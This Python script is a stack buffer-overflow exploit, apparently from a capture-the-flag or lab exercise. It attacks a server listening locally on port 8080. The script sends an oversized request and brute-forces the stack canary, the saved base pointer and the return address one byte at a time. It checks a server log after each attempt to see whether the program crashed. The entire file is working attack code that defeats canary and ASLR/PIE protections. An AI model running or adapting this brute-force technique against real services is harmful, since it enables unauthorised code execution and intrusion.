import time
import socket as sock

LP_IP = "0.0.0.0"
LP_PORT = 8080

# helper methods

# get all data from the lp, used to reduce timing issues
def recvall(s):
    time.sleep(0.5)
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = s.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data

# send current canary/aslr/return address payload
def send_payload(payload):
    socket = sock.socket()
    socket.connect((LP_IP, LP_PORT))
    socket.send(b"Content-Length: 4096\r\n\r\n")
    for i in range(40):
        socket.send(b"\x69"*100)
    socket.send(b"\x69"*104+bytes(payload))
    resp = recvall(socket)
    socket.close()
    return resp

# check that the payload did not cause a program crash
def byte_passes():
    with open("ps_server.log", 'r') as f:
        line_contents = f.readlines()[-1].strip().split()
        return line_contents[-1] == "0" and line_contents[-2] == "status"

# find the next byte that does not cause a program crash
def brute_force_byte(bytes_so_far, length_check):
    b = 0
    while b < 256:
        print(f"Trying {b}")
        resp = send_payload(bytes_so_far+[b])
        if len(resp)==length_check:
            if byte_passes():
                return b
            b += 1
        else:
            print('timing error')

# this script will run locally on the lp
# ability to prematurely exit and print bytes bruteforced so far added in case of weird timing issues

#brute force canary bytes
canary = [0]
for iter in range(1, 8):
    print(f"iteration {iter+1}")
    length_check = 4243 + iter
    byte = brute_force_byte(canary, length_check)
    if byte is None:
        print('Issue occurred, restart script')
        print("canary is", canary)
    else:
        canary.append(byte)

print(canary)

# brute force ASLR/PIE
padder = [0]*16
aslr_rbp = []
for iter in range(8):
    print(f"iteration {iter+1}")
    length_check = 4251+16+iter
    byte = brute_force_byte(canary+padder+aslr_rbp, length_check)
    if byte is None:
        print('Issue occurred, restart script')
        print("rbp is", aslr_rbp)
    else:
        aslr_rbp.append(byte)

print(aslr_rbp)

#brute force return address
ret_addr = [95]
for iter in range(1, 8):
    print(f"iteration {iter+1}")
    length_check = 4251+16+8+iter
    byte = brute_force_byte(canary+padder+aslr_rbp+ret_addr, length_check)
    if byte is None:
        print('Issue occurred, restart script')
        print("return is", ret_addr)
    else:
        ret_addr.append(byte)

print(aslr_rbp)

print(canary)
print(aslr_rbp)
print(ret_addr)